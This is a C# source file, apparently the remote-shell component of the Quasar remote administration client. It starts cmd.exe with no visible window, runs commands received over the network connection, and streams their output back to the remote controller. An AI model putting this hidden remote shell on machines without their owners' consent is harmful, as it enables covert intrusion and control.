using Quasar.Common.Messages;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// This class manages a remote shell session.
    /// </summary>
    public class Shell : IDisposable
    {
        /// <summary>
        /// The process of the command-line (cmd).
        /// </summary>
        private Process _prc;

        /// <summary>
        /// The current console encoding.
        /// </summary>
        private Encoding _encoding;

        /// <summary>
        /// Redirects commands to the standard input stream of the console with the correct encoding.
        /// </summary>
        private StreamWriter _inputWriter;

        /// <summary>
        /// Creates a new session of the shell.
        /// </summary>
        private void CreateSession()
        {
            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;
            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _prc.Start();
            _prc.OutputDataReceived += StandardOutputReceiver;
            _prc.BeginOutputReadLine();
            _prc.ErrorDataReceived += StandardErrorReceiver;
            _prc.BeginErrorReadLine();
            _inputWriter = _prc.StandardInput;

            Program.ConnectClient.Send(new DoShellExecuteResponse
            {
                Output = "\n>> New Session created\n"
            });
        }

        private void StandardOutputReceiver(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                Program.ConnectClient.Send(new DoShellExecuteResponse {Output = ConvertEncoding(_encoding, e.Data) + '\n', IsError = false});
            }
        }

        private void StandardErrorReceiver(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                Program.ConnectClient.Send(new DoShellExecuteResponse {Output = ConvertEncoding(_encoding, e.Data) + '\n', IsError = true});
            }
        }

        /// <summary>
        /// Executes a shell command.
        /// </summary>
        /// <param name="command">The command to execute.</param>
        /// <returns>False if execution failed, else True.</returns>
        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
            {
                try
                {
                    CreateSession();
                }
                catch (Exception ex)
                {
                    Program.ConnectClient.Send(new DoShellExecuteResponse
                    {
                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
                        IsError = true
                    });
                    return false;
                }
            }

            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
            _inputWriter.Flush();

            return true;
        }

        /// <summary>
        /// Converts the encoding of an input string to UTF-8 format.
        /// </summary>
        /// <param name="sourceEncoding">The source encoding of the input string.</param>
        /// <param name="input">The input string.</param>
        /// <returns>The input string in UTF-8 format.</returns>
        private string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        /// <summary>
        /// Releases all resources used by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_prc == null)
                    return;

                if (_inputWriter != null)
                {
                    _inputWriter.Close();
                    _inputWriter = null;
                }

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }
                _prc.Dispose();
                _prc = null;
            }
        }
    }
}
